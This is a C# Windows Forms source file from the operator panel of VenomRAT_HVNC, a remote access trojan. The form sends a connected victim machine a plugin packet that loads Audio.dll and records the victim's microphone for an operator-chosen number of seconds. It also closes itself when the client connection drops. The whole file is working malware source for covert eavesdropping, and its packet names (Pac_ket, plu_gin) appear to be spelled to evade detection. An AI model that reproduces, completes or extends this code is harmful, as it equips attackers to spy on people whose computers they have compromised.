using System;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Algorithm;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Forms
{
    public partial class FormAudio : Form
    {
        public Form1 F { get; set; }

        internal Clients ParentClient { get; set; }

        internal Clients Client { get; set; }

        public FormAudio()
        {
            this.InitializeComponent();
            base.MinimizeBox = false;
            base.MaximizeBox = false;
        }

        public byte[] BytesToPlay { get; set; }

        private void btnStartStopRecord_Click(object sender, EventArgs e)
        {
            if (this.textBox1.Text != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "audio";
                msgPack.ForcePathObject("Second").AsString = this.textBox1.Text;
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Audio.dll");
                msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
                Thread.Sleep(100);
                this.btnStartStopRecord.Text = "Wait...";
                this.btnStartStopRecord.Enabled = false;
                return;
            }
            MessageBox.Show("Input seconds to record.");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.Client.TcpClient.Connected || !this.ParentClient.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        private void FormAudio_Load(object sender, EventArgs e)
        {
        }

        private void bunifuGroupBox1_Enter(object sender, EventArgs e)
        {
        }

        private SoundPlayer SP = new SoundPlayer();
    }
}
